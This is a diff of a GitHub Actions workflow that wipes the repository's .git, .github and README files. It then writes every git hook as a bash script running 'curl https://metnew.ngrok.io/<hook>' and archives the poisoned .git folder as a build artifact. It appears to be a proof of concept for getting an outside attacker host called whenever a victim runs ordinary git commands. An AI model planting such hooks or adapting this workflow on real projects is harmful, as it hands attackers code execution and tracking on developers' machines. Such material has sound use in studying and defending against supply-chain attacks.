@@ -11,16 +11,13 @@ jobs:
       - run: |
           rm -rf .git/* && rm -rf ./.github && rm -rf README.md
           mkdir -p .git/hooks
-          chmod -R 601 .git
           export PAYLOAD="curl https://metnew.ngrok.io"
           declare -a arr=("applypatch-msg" "pre-commit" "commit-msg" "pre-merge" "fsmonitor-watchman" "pre-merge-commit"  "post-applypatch" "pre-push" "post-checkout" "pre-rebase" "post-index-change" "pre-receive" "post-merge"   "prepare-commit-msg" "post-rewrite" "push-to-checkout" "post-update" "reference-transaction" "pre-applypatch"   "sendemail-validate" "pre-auto-gc" "update")
           for i in "${arr[@]}"
           do
              echo -e "#!/usr/bin/env bash\n$PAYLOAD/$i" > ".git/hooks/$i"
-             chmod 601 ".git/hooks/$i"
           done
       - run: chmod -R 601 .git
-      - run: chmod +x ./.git/hooks/post-checkout
       - run: ls -lah ./.git/hooks
       # - run: zip -r ./artifacts.zip .git
       - name: Archive production artifacts
